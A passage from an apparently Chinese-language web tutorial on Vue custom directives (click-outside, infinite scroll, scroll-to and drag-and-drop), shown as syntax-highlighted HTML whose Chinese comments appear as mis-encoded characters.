    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">touchstart</span>) config.<span class="hljs-property">events</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'touchstart'</span>)
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">capture</span>) config.<span class="hljs-property">capture</span> = <span class="hljs-literal">true</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">immediate</span>) config.<span class="hljs-property">immediate</span> = <span class="hljs-literal">true</span>
    
    <span class="hljs-comment">// å¤„ç†å‚æ•°</span>
    <span class="hljs-keyword">if</span> (arg === <span class="hljs-string">'except'</span>) {
      <span class="hljs-comment">// æ’é™¤æŸäº›å…ƒç´ </span>
      config.<span class="hljs-property">except</span> = binding.<span class="hljs-property">value</span>?.<span class="hljs-property">except</span> || []
    }
    
    <span class="hljs-comment">// å­˜å‚¨é…ç½®</span>
    el.<span class="hljs-property">_clickOutsideConfig</span> = config
    
    <span class="hljs-comment">// äº‹ä»¶å¤„ç†å‡½æ•°</span>
    el.<span class="hljs-property">_clickOutsideHandler</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (!config.<span class="hljs-property">enabled</span>) <span class="hljs-keyword">return</span>
      
      <span class="hljs-comment">// æ£€æŸ¥ç‚¹å‡»æ˜¯å¦åœ¨æ’é™¤åˆ—è¡¨ä¸­</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">except</span>) {
        <span class="hljs-keyword">const</span> clickedInsideExcept = config.<span class="hljs-property">except</span>.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">selector</span> =&gt;</span> {
          <span class="hljs-keyword">const</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(selector)
          <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(elements).<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">element</span> =&gt;</span> 
            element.<span class="hljs-title function_">contains</span>(event.<span class="hljs-property">target</span>)
          )
        })
        
        <span class="hljs-keyword">if</span> (clickedInsideExcept) <span class="hljs-keyword">return</span>
      }
      
      <span class="hljs-comment">// æ£€æŸ¥ç‚¹å‡»æ˜¯å¦åœ¨å…ƒç´ å¤–éƒ¨</span>
      <span class="hljs-keyword">if</span> (!(el === event.<span class="hljs-property">target</span> || el.<span class="hljs-title function_">contains</span>(event.<span class="hljs-property">target</span>))) {
        config.<span class="hljs-title function_">handler</span>(event, el)
      }
    }
    
    <span class="hljs-comment">// æ·»åŠ äº‹ä»¶ç›‘å¬</span>
    config.<span class="hljs-property">events</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">eventName</span> =&gt;</span> {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(
        eventName, 
        el.<span class="hljs-property">_clickOutsideHandler</span>, 
        config.<span class="hljs-property">capture</span>
      )
    })
    
    <span class="hljs-comment">// ç«‹å³æ‰§è¡Œä¸€æ¬¡æ£€æŸ¥ï¼ˆå¦‚æœé…ç½®äº†ï¼‰</span>
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">immediate</span>) {
      <span class="hljs-comment">// æ¨¡æ‹Ÿå¤–éƒ¨ç‚¹å‡»</span>
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">const</span> fakeEvent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MouseEvent</span>(<span class="hljs-string">'click'</span>)
        el.<span class="hljs-title function_">_clickOutsideHandler</span>(fakeEvent)
      })
    }
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> oldConfig = el.<span class="hljs-property">_clickOutsideConfig</span>
    <span class="hljs-keyword">const</span> newValue = binding.<span class="hljs-property">value</span>
    
    <span class="hljs-comment">// æ›´æ–°é…ç½®</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newValue === <span class="hljs-string">'function'</span>) {
      el.<span class="hljs-property">_clickOutsideConfig</span>.<span class="hljs-property">handler</span> = newValue
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newValue === <span class="hljs-string">'object'</span>) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(el.<span class="hljs-property">_clickOutsideConfig</span>, newValue)
    }
    
    <span class="hljs-comment">// å¦‚æœå¯åœçŠ¶æ€å˜åŒ–ï¼Œå¯èƒ½éœ€è¦æ›´æ–°äº‹ä»¶ç›‘å¬</span>
    <span class="hljs-keyword">if</span> (oldConfig?.<span class="hljs-property">enabled</span> !== el.<span class="hljs-property">_clickOutsideConfig</span>?.<span class="hljs-property">enabled</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç‚¹å‡»å¤–éƒ¨æŒ‡ä»¤å¯åœçŠ¶æ€å˜åŒ–'</span>)
    }
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-keyword">const</span> config = el.<span class="hljs-property">_clickOutsideConfig</span>
    
    <span class="hljs-keyword">if</span> (config &amp;&amp; el.<span class="hljs-property">_clickOutsideHandler</span>) {
      <span class="hljs-comment">// ç§»é™¤æ‰€æœ‰äº‹ä»¶ç›‘å¬</span>
      config.<span class="hljs-property">events</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">eventName</span> =&gt;</span> {
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(
          eventName, 
          el.<span class="hljs-property">_clickOutsideHandler</span>, 
          config.<span class="hljs-property">capture</span>
        )
      })
      
      <span class="hljs-comment">// æ¸…ç†å¼•ç”¨</span>
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_clickOutsideConfig</span>
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_clickOutsideHandler</span>
    }
  }
}

<span class="hljs-comment">// ç”¨æ³•ç¤ºä¾‹</span>
<span class="hljs-comment">// &lt;div v-click-outside="closeMenu"&gt;èœå•å†…å®¹&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-click-outside.advanced="{ handler: closeMenu, enabled: isOpen }"&gt;</span>
<span class="hljs-comment">// &lt;div v-click-outside:except="{ handler: closeMenu, except: ['.ignore-click'] }"&gt;</span>
<span class="hljs-comment">// &lt;div v-click-outside.mousedown.touchstart="closeMenu"&gt;</span>
</code></pre>
<h4 data-id="heading-10">3.3 æ»šåŠ¨æŒ‡ä»¤</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ»šåŠ¨æŒ‡ä»¤é›†</span>
<span class="hljs-keyword">const</span> scrollDirectives = {
  <span class="hljs-comment">// æ— é™æ»šåŠ¨æŒ‡ä»¤</span>
  <span class="hljs-attr">infiniteScroll</span>: {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> { <span class="hljs-attr">value</span>: callback, modifiers, arg } = binding
      
      <span class="hljs-comment">// é…ç½®é€‰é¡¹</span>
      <span class="hljs-keyword">const</span> options = {
        <span class="hljs-attr">distance</span>: <span class="hljs-number">50</span>,           <span class="hljs-comment">// è§¦å‘è·ç¦»</span>
        <span class="hljs-attr">delay</span>: <span class="hljs-number">100</span>,            <span class="hljs-comment">// é˜²æŠ–å»¶è¿Ÿ</span>
        <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span>,       <span class="hljs-comment">// ç«‹å³æ£€æŸ¥</span>
        <span class="hljs-attr">disabled</span>: <span class="hljs-literal">false</span>,       <span class="hljs-comment">// æ˜¯å¦ç¦ç”¨</span>
        <span class="hljs-attr">direction</span>: <span class="hljs-string">'vertical'</span>  <span class="hljs-comment">// æ»šåŠ¨æ–¹å‘</span>
      }
      
      <span class="hljs-comment">// è§£æå‚æ•°</span>
      <span class="hljs-keyword">if</span> (arg === <span class="hljs-string">'distance'</span>) {
        options.<span class="hljs-property">distance</span> = <span class="hljs-built_in">parseInt</span>(binding.<span class="hljs-property">value</span>) || options.<span class="hljs-property">distance</span>
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'object'</span>) {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(options, binding.<span class="hljs-property">value</span>)
      }
      
      <span class="hljs-comment">// å­˜å‚¨é…ç½®</span>
      el.<span class="hljs-property">_infiniteScrollOptions</span> = options
      
      <span class="hljs-comment">// é˜²æŠ–å‡½æ•°</span>
      <span class="hljs-keyword">let</span> checkTimer = <span class="hljs-literal">null</span>
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkScroll</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-keyword">if</span> (options.<span class="hljs-property">disabled</span>) <span class="hljs-keyword">return</span>
        
        <span class="hljs-keyword">let</span> isAtEnd = <span class="hljs-literal">false</span>
        
        <span class="hljs-keyword">if</span> (options.<span class="hljs-property">direction</span> === <span class="hljs-string">'vertical'</span>) {
          <span class="hljs-keyword">const</span> scrollTop = el.<span class="hljs-property">scrollTop</span>
          <span class="hljs-keyword">const</span> scrollHeight = el.<span class="hljs-property">scrollHeight</span>
          <span class="hljs-keyword">const</span> clientHeight = el.<span class="hljs-property">clientHeight</span>
          
          isAtEnd = scrollHeight - scrollTop - clientHeight &lt;= options.<span class="hljs-property">distance</span>
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">const</span> scrollLeft = el.<span class="hljs-property">scrollLeft</span>
          <span class="hljs-keyword">const</span> scrollWidth = el.<span class="hljs-property">scrollWidth</span>
          <span class="hljs-keyword">const</span> clientWidth = el.<span class="hljs-property">clientWidth</span>
          
          isAtEnd = scrollWidth - scrollLeft - clientWidth &lt;= options.<span class="hljs-property">distance</span>
        }
        
        <span class="hljs-keyword">if</span> (isAtEnd) {
          <span class="hljs-title function_">callback</span>()
        }
      }
      
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">debouncedCheck</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-keyword">if</span> (checkTimer) <span class="hljs-built_in">clearTimeout</span>(checkTimer)
        checkTimer = <span class="hljs-built_in">setTimeout</span>(checkScroll, options.<span class="hljs-property">delay</span>)
      }
      
      <span class="hljs-comment">// ç›‘å¬æ»šåŠ¨äº‹ä»¶</span>
      el.<span class="hljs-property">_infiniteScrollHandler</span> = debouncedCheck
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, el.<span class="hljs-property">_infiniteScrollHandler</span>)
      
      <span class="hljs-comment">// ç›‘å¬çª—å£å¤§å°å˜åŒ–</span>
      el.<span class="hljs-property">_resizeHandler</span> = debouncedCheck
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, el.<span class="hljs-property">_resizeHandler</span>)
      
      <span class="hljs-comment">// ç«‹å³æ£€æŸ¥ä¸€æ¬¡</span>
      <span class="hljs-keyword">if</span> (options.<span class="hljs-property">immediate</span>) {
        <span class="hljs-built_in">setTimeout</span>(checkScroll, <span class="hljs-number">100</span>)
      }
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> options = el.<span class="hljs-property">_infiniteScrollOptions</span>
      <span class="hljs-keyword">const</span> newValue = binding.<span class="hljs-property">value</span>
      
      <span class="hljs-comment">// æ›´æ–°é…ç½®</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newValue === <span class="hljs-string">'object'</span>) {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(options, newValue)
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newValue === <span class="hljs-string">'function'</span>) {
        <span class="hljs-comment">// å¦‚æœä¼ å…¥äº†æ–°å‡½æ•°ï¼Œéœ€è¦æ›´æ–°å›è°ƒ</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œéœ€è¦é‡æ–°ç»‘å®šäº‹ä»¶ï¼Œç®€åŒ–å¤„ç†</span>
      }
      
      <span class="hljs-comment">// å¼ºåˆ¶æ£€æŸ¥ä¸€æ¬¡</span>
      <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">force</span>) {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-keyword">const</span> event = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">'scroll'</span>)
          el.<span class="hljs-title function_">dispatchEvent</span>(event)
        })
      }
    },
    
    <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-comment">// æ¸…ç†äº‹ä»¶ç›‘å¬</span>
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_infiniteScrollHandler</span>) {
        el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, el.<span class="hljs-property">_infiniteScrollHandler</span>)
        <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_infiniteScrollHandler</span>
      }
      
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_resizeHandler</span>) {
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, el.<span class="hljs-property">_resizeHandler</span>)
        <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_resizeHandler</span>
      }
      
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_infiniteScrollOptions</span>
    }
  },
  
  <span class="hljs-comment">// æ»šåŠ¨åˆ°å…ƒç´ æŒ‡ä»¤</span>
  <span class="hljs-attr">scrollTo</span>: {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> { value, modifiers, arg } = binding
      
      el.<span class="hljs-property">_scrollToHandler</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
        event.<span class="hljs-title function_">preventDefault</span>()
        
        <span class="hljs-keyword">const</span> targetSelector = <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'string'</span> ? value : value?.<span class="hljs-property">target</span>
        <span class="hljs-keyword">const</span> options = <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> ? value : {}
        
        <span class="hljs-keyword">const</span> targetElement = targetSelector 
          ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(targetSelector)
          : <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>
        
        <span class="hljs-keyword">if</span> (!targetElement) <span class="hljs-keyword">return</span>
        
        <span class="hljs-comment">// æ»šåŠ¨é…ç½®</span>
        <span class="hljs-keyword">const</span> scrollOptions = {
          <span class="hljs-attr">behavior</span>: modifiers.<span class="hljs-property">smooth</span> ? <span class="hljs-string">'smooth'</span> : <span class="hljs-string">'auto'</span>,
          <span class="hljs-attr">block</span>: arg || <span class="hljs-string">'start'</span>,  <span class="hljs-comment">// start, center, end, nearest</span>
          <span class="hljs-attr">inline</span>: <span class="hljs-string">'nearest'</span>
        }
        
        <span class="hljs-comment">// åˆå¹¶é€‰é¡¹</span>
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(scrollOptions, options)
        
        <span class="hljs-comment">// æ‰§è¡Œæ»šåŠ¨</span>
        targetElement.<span class="hljs-title function_">scrollIntoView</span>(scrollOptions)
        
        <span class="hljs-comment">// è§¦å‘å›è°ƒ</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> &amp;&amp; value.<span class="hljs-property">onScroll</span>) {
          value.<span class="hljs-title function_">onScroll</span>(targetElement)
        }
      }
      
      <span class="hljs-comment">// æ·»åŠ ç‚¹å‡»äº‹ä»¶</span>
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_scrollToHandler</span>)
      
      <span class="hljs-comment">// è‡ªåŠ¨æ»šåŠ¨ï¼ˆå¦‚æœé…ç½®äº†ï¼‰</span>
      <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">auto</span>) {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          el.<span class="hljs-title function_">_scrollToHandler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">'click'</span>))
        }, value?.<span class="hljs-property">delay</span> || <span class="hljs-number">0</span>)
      }
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-comment">// å¦‚æœå€¼å˜åŒ–ä¸”é…ç½®äº†autoï¼Œé‡æ–°è§¦å‘</span>
      <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span> !== binding.<span class="hljs-property">oldValue</span> &amp;&amp; binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">auto</span>) {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_scrollToHandler</span>) {
            el.<span class="hljs-title function_">_scrollToHandler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">'click'</span>))
          }
        }, binding.<span class="hljs-property">value</span>?.<span class="hljs-property">delay</span> || <span class="hljs-number">0</span>)
      }
    },
    
    <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_scrollToHandler</span>) {
        el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_scrollToHandler</span>)
        <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_scrollToHandler</span>
      }
    }
  }
}

<span class="hljs-comment">// ç”¨æ³•ç¤ºä¾‹</span>
<span class="hljs-comment">// &lt;div v-infinite-scroll="loadMore"&gt;å†…å®¹...&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-infinite-scroll.distance="100"&gt;è‡ªå®šä¹‰è·ç¦»&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-infinite-scroll="{ handler: loadMore, distance: 100, disabled: isLoading }"&gt;</span>
<span class="hljs-comment">// &lt;button v-scroll-to="'#section'"&gt;æ»šåŠ¨åˆ°ç« èŠ‚&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;button v-scroll-to.smooth.auto="{ target: '#section', delay: 500 }"&gt;è‡ªåŠ¨æ»šåŠ¨&lt;/button&gt;</span>
</code></pre>
<h4 data-id="heading-11">3.4 æ‹–æ”¾æŒ‡ä»¤</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ‹–æ”¾æŒ‡ä»¤</span>
<span class="hljs-keyword">const</span> vDrag = {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { value, modifiers } = binding
    
    <span class="hljs-comment">// é»˜è®¤é…ç½®</span>
    <span class="hljs-keyword">const</span> config = {
      <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>,           <span class="hljs-comment">// æ‹–æ‹½æ•°æ®</span>
      <span class="hljs-attr">effect</span>: <span class="hljs-string">'move'</span>,       <span class="hljs-comment">// æ‹–æ‹½æ•ˆæœ</span>
      <span class="hljs-attr">disabled</span>: <span class="hljs-literal">false</span>,      <span class="hljs-comment">// æ˜¯å¦ç¦ç”¨</span>
      <span class="hljs-attr">handle</span>: <span class="hljs-literal">null</span>,         <span class="hljs-comment">// æ‹–æ‹½æ‰‹æŸ„é€‰æ‹©å™¨</span>
      <span class="hljs-attr">ghost</span>: <span class="hljs-literal">true</span>,          <span class="hljs-comment">// æ˜¾ç¤ºå¹½çµå›¾åƒ</span>
      <span class="hljs-attr">clone</span>: <span class="hljs-literal">false</span>,         <span class="hljs-comment">// å…‹éš†å…ƒç´ </span>
      <span class="hljs-attr">axis</span>: <span class="hljs-string">'both'</span>,         <span class="hljs-comment">// æ‹–æ‹½è½´å‘ï¼šboth, x, y</span>
      <span class="hljs-attr">boundary</span>: <span class="hljs-literal">null</span>,       <span class="hljs-comment">// è¾¹ç•Œé™åˆ¶</span>
      <span class="hljs-attr">onStart</span>: <span class="hljs-literal">null</span>,        <span class="hljs-comment">// å¼€å§‹å›è°ƒ</span>
      <span class="hljs-attr">onMove</span>: <span class="hljs-literal">null</span>,         <span class="hljs-comment">// ç§»åŠ¨å›è°ƒ</span>
      <span class="hljs-attr">onEnd</span>: <span class="hljs-literal">null</span>           <span class="hljs-comment">// ç»“æŸå›è°ƒ</span>
    }
    
    <span class="hljs-comment">// åˆå¹¶é…ç½®</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span>) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(config, value)
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value !== <span class="hljs-literal">undefined</span>) {
      config.<span class="hljs-property">data</span> = value
    }
    
    <span class="hljs-comment">// å¤„ç†ä¿®é¥°ç¬¦</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">copy</span>) config.<span class="hljs-property">effect</span> = <span class="hljs-string">'copy'</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">link</span>) config.<span class="hljs-property">effect</span> = <span class="hljs-string">'link'</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">x</span>) config.<span class="hljs-property">axis</span> = <span class="hljs-string">'x'</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">y</span>) config.<span class="hljs-property">axis</span> = <span class="hljs-string">'y'</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">noGhost</span>) config.<span class="hljs-property">ghost</span> = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">clone</span>) config.<span class="hljs-property">clone</span> = <span class="hljs-literal">true</span>
    
    <span class="hljs-comment">// å­˜å‚¨é…ç½®å’ŒçŠ¶æ€</span>
    el.<span class="hljs-property">_dragConfig</span> = config
    el.<span class="hljs-property">_dragState</span> = {
      <span class="hljs-attr">isDragging</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">startX</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">startY</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">offsetX</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">offsetY</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">clone</span>: <span class="hljs-literal">null</span>
    }
    
    <span class="hljs-comment">// è®¾ç½®å…ƒç´ å±æ€§</span>
    el.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'draggable'</span>, !config.<span class="hljs-property">disabled</span>)
    
    <span class="hljs-comment">// æ‰¾åˆ°æ‹–æ‹½æ‰‹æŸ„</span>
    <span class="hljs-keyword">const</span> dragHandle = config.<span class="hljs-property">handle</span> 
      ? el.<span class="hljs-title function_">querySelector</span>(config.<span class="hljs-property">handle</span>) 
      : el
    
    <span class="hljs-comment">// äº‹ä»¶å¤„ç†å‡½æ•°</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">onDragStart</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">disabled</span>) {
        e.<span class="hljs-title function_">preventDefault</span>()
        <span class="hljs-keyword">return</span>
      }
      
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">true</span>
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">startX</span> = e.<span class="hljs-property">clientX</span>
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">startY</span> = e.<span class="hljs-property">clientY</span>
      
      <span class="hljs-comment">// è®¾ç½®æ‹–æ‹½æ•°æ®</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">data</span> !== <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">const</span> dataString = <span class="hljs-keyword">typeof</span> config.<span class="hljs-property">data</span> === <span class="hljs-string">'string'</span> 
          ? config.<span class="hljs-property">data</span> 
          : <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(config.<span class="hljs-property">data</span>)
        
        e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-title function_">setData</span>(<span class="hljs-string">'application/json'</span>, dataString)
        e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-title function_">setData</span>(<span class="hljs-string">'text/plain'</span>, dataString)
      }
      
      <span class="hljs-comment">// è®¾ç½®æ‹–æ‹½æ•ˆæœ</span>
      e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-property">effectAllowed</span> = config.<span class="hljs-property">effect</span>
      
      <span class="hljs-comment">// åˆ›å»ºå¹½çµå›¾åƒ</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">ghost</span>) {
        <span class="hljs-keyword">const</span> ghost = el.<span class="hljs-title function_">cloneNode</span>(<span class="hljs-literal">true</span>)
        ghost.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">'0.5'</span>
        ghost.<span class="hljs-property">style</span>.<span class="hljs-property">position</span> = <span class="hljs-string">'absolute'</span>
        ghost.<span class="hljs-property">style</span>.<span class="hljs-property">top</span> = <span class="hljs-string">'-1000px'</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(ghost)
        e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-title function_">setDragImage</span>(ghost, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
        
        <span class="hljs-comment">// ç¨åç§»é™¤</span>
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">contains</span>(ghost)) {
            <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(ghost)
          }
        }, <span class="hljs-number">0</span>)
      }
      
      <span class="hljs-comment">// å…‹éš†å…ƒç´ ï¼ˆå¦‚æœéœ€è¦ï¼‰</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">clone</span>) {
        <span class="hljs-keyword">const</span> clone = el.<span class="hljs-title function_">cloneNode</span>(<span class="hljs-literal">true</span>)
        clone.<span class="hljs-property">style</span>.<span class="hljs-property">position</span> = <span class="hljs-string">'absolute'</span>
        clone.<span class="hljs-property">style</span>.<span class="hljs-property">zIndex</span> = <span class="hljs-string">'1000'</span>
        clone.<span class="hljs-property">style</span>.<span class="hljs-property">pointerEvents</span> = <span class="hljs-string">'none'</span>
        clone.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">'0.7'</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(clone)
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span> = clone
      }
      
      <span class="hljs-comment">// è§¦å‘å¼€å§‹å›è°ƒ</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> config.<span class="hljs-property">onStart</span> === <span class="hljs-string">'function'</span>) {
        config.<span class="hljs-title function_">onStart</span>(e, el, config.<span class="hljs-property">data</span>)
      }
      
      <span class="hljs-comment">// æ·»åŠ æ‹–æ‹½æ ·å¼</span>
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'dragging'</span>)
    }
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">onDrag</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-keyword">if</span> (!el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">isDragging</span>) <span class="hljs-keyword">return</span>
      
      <span class="hljs-comment">// è®¡ç®—åç§»</span>
      <span class="hljs-keyword">const</span> deltaX = e.<span class="hljs-property">clientX</span> - el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">startX</span>
      <span class="hljs-keyword">const</span> deltaY = e.<span class="hljs-property">clientY</span> - el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">startY</span>
      
      <span class="hljs-comment">// è½´å‘é™åˆ¶</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">axis</span> === <span class="hljs-string">'x'</span>) {
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span> = deltaX
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span> = <span class="hljs-number">0</span>
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (config.<span class="hljs-property">axis</span> === <span class="hljs-string">'y'</span>) {
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span> = <span class="hljs-number">0</span>
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span> = deltaY
      } <span class="hljs-keyword">else</span> {
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span> = deltaX
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span> = deltaY
      }
      
      <span class="hljs-comment">// è¾¹ç•Œé™åˆ¶</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">boundary</span>) {
